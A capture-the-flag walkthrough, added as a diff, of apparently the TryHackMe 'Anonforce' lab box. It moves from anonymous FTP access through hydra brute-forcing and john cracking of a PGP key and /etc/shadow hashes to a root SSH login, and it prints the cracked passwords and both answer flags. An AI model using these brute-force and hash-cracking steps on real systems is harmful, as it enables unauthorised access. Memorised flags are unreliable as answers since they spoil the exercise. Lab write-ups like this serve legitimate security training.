@@ -1,0 +1,233 @@
+ANONFORCE.
+
+
+
+
+[>>> 1. ENUMERATION: PORTS/SERVICES]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.76.174
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+[>>> 2. RECON: FTP (21)]
+[ACTION: log in to ftp as anon]
+ftp 10.10.76.174 -p 21
+anonymous
+(no password, press enter)
+[OUTPUT]
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+
+
+[ACTION: display content current directory]
+ls
+[OUTPUT]
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+drwxr-xr-x   17 0        0            3700 Aug 04 12:20 dev
+drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
+drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+drwx------    2 0        0           16384 Aug 11  2019 lost+found
+drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+dr-xr-xr-x   84 0        0               0 Aug 04 12:20 proc
+drwx------    3 0        0            4096 Aug 11  2019 root
+drwxr-xr-x   18 0        0             540 Aug 04 12:20 run
+drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+dr-xr-xr-x   13 0        0               0 Aug 04 12:20 sys
+drwxrwxrwt    9 0        0            4096 Aug 04 12:20 tmp
+drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
+drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
+[NOTE]
+Looks like a backup.
+
+
+[ACTION: display content of home]
+cd home
+ls
+[OUTPUT]
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+
+
+[ACTION: move into meliodas]
+cd meliodas
+[OUTPUT]
+530 Can't change from guest user.
+Login failed.
+[NOTE]
+We have a user.
+We will try to bruteforce both ftp and ssh.
+
+
+
+[>>> 3. BRUTEFORCING: FTP AND SSH]
+[ACTION: bruteforce meliodas ftp]
+hydra -l meliodas -P ~/thm/rockyou.txt -s 21 ftp://10.10.76.174
+
+
+
+[ACTION: bruteforce meliodas ssh]
+hydra -l meliodas -P ~/thm/rockyou.txt -s 22 10.10.76.174 ssh
+
+
+[NOTE]
+Both commands were taking too long.
+I also realized I completely looked over an interesting directory in ftp.
+Connect as done before.
+[>>> 4. RECON: FTP (21)]
+[ACTION: list content of notread]
+cd notread
+ls
+[OUTPUT]
+-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
+-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
+[NOTE]
+We found a private key and a pgp encrypted file.
+
+
+[ACTION: download all files in current directory]
+prompt off 
+mget *
+
+
+[ACTION: import private (key)]
+gpg --import private.asc
+[NOTE]
+Asks for password.
+Room title clues towards having to use anon (done) and bruteforcing (we are about to).
+
+
+
+
+[>>> 4. BRUTEFORCING: asc key]
+[ACTION: get hash]
+gpg2john private.asc > privateasc_hash.txt
+
+
+[ACTION: bruteforce via john]
+john privateasc_hash.txt --wordlist=~/thm/rockyou.txt
+[OUTPUT]
+xbox360          (anonforce)     
+
+
+[ACTION: import key]
+gpg --import private.asc
+[OUTPUT]
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: key B92CD1F280AD82C2: secret key imported
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: Total number processed: 2
+gpg:              unchanged: 2
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+
+
+[ACTION: decript gpg protected backup]
+gpg --output decrypted_backup.txt --decrypt backup.pgp
+[OUTPUT]
+gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
+      "anonforce <melodias@anonforce.nsa>"
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+
+
+[ACTION: display content of decrypted_backup]
+cat decrypted_backup.txt
+[OUPTUT]
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7:::
+[NOTE]
+We found a dump of /etc/shadow.
+
+
+
+
+[>>> 5. PRIVESC: TO USER]
+[NOTE]
+We will focus on users: root, meliodas.
+Paste their strings into found_hashes.txt
+[ACTION: crack password hashes via john]
+john found_hashes.txt --wordlist=~/thm/rockyou.txt
+[NOTE]
+John is facing issues due to us mixing multiple hash types:
+1. root: $6$ (sha-512)
+2. meliodas: $1$ (md5)
+
+
+[NOTE]
+Saved string: root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
+To: root_anon_hash.txt
+[ACTION: run john on root]
+john root_anon_hash.txt --wordlist=~/thm/rockyou.txt --format=sha512crypt
+[OUTPUT]
+hikari           (root)     
+[NOTE]
+Looks like we privesc straight to root.
+
+
+
+
+[>>> 6. PRIVESC TO: ROOT]
+[ACTION: ssh as root]
+ssh root@10.10.76.174
+
+
+[ACTION: find flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/melodias/user.txt
+
+
+[ACTION: display user flag]
+cat /home/melodias/user.txt
+[OUTPUT]
+606083fd33beb1284fc51f411a706af8
+
+
+[ACTION: display root flag]
+cat /root/root.txt
+[OUTPUT]
+f706456440c7af4187810c31c6cebdce
